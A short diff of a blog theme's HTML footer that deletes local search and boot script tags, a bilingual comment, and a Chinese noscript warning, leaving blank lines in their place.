-  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+
+
+
+
+
+
+
+
 
 
   
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
+  
+
 </body>
 </html>
